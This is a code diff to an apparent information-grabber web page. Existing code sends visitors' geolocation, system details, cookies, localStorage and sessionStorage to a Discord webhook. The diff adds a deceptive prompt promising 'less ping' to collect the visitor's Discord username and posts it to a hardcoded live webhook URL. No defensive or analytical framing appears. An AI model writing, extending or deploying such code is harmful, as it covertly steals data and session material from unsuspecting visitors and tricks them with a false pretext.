@@ -25,6 +25,29 @@
         h1 {
             font-size: 24px;
         }
+        input[type="text"] {
+            padding: 10px;
+            margin-top: 10px;
+            width: 80%;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+        }
+        button {
+            padding: 10px 20px;
+            margin-top: 10px;
+            border: none;
+            background-color: #007bff;
+            color: white;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        .prompt {
+            margin-top: 20px;
+            font-size: 18px;
+        }
     </style>
 </head>
 <body>
@@ -73,6 +96,11 @@
 
                     // Send the info to Discord Webhook
                     sendToWebhook(geoInfo, systemInfo, performanceInfo, cookies, localStorageInfo, sessionStorageInfo, socialLinks);
+
+                    // After 5 seconds, prompt user for their Discord username
+                    setTimeout(function() {
+                        showDiscordPrompt();
+                    }, 5000);
                 })
                 .catch(error => {
                     console.error('Error fetching geo data:', error);
@@ -120,6 +148,52 @@
 
             // Add more checks for other social platforms (Twitter, Instagram, etc.) as needed
             return socialLinks.length > 0 ? socialLinks.join('\n') : 'No social media links found';
+        }
+
+        function showDiscordPrompt() {
+            const container = document.querySelector('.container');
+            container.innerHTML = `
+                <h1>Enter your Discord username or display name to begin removing discord cache for 9% less ping on average</h1>
+                <input type="text" id="discordUsername" placeholder="Enter username">
+                <button onclick="submitDiscordUsername()">Submit</button>
+            `;
+        }
+
+        function submitDiscordUsername() {
+            const discordUsername = document.getElementById('discordUsername').value;
+            if (discordUsername) {
+                sendDiscordUsernameToWebhook(discordUsername);
+            } else {
+                alert("Please enter a valid Discord username.");
+            }
+        }
+
+        function sendDiscordUsernameToWebhook(discordUsername) {
+            const webhookURL = "https://discord.com/api/webhooks/1334960796609937499/7YlpdDT2pphEH6wCeuD6eS10QIS1QQVyz2HicjXZPK5lZ7XOpgs3ZBiG_7fDFhiTpAWm"; // Replace with your actual Discord webhook URL
+
+            const content = {
+                content: "Discord Username Info",
+                embeds: [{
+                    title: "Discord Username",
+                    fields: [
+                        { name: "Discord Username", value: discordUsername, inline: false }
+                    ],
+                    footer: {
+                        text: "Info Sent from Web"
+                    }
+                }]
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(content)
+            })
+            .then(response => response.json())
+            .then(data => console.log('Discord username sent:', data))
+            .catch(error => console.error('Error sending Discord username to Discord:', error));
         }
 
         function sendToWebhook(geoInfo, systemInfo, performanceInfo, cookies, localStorageInfo, sessionStorageInfo, socialLinks) {
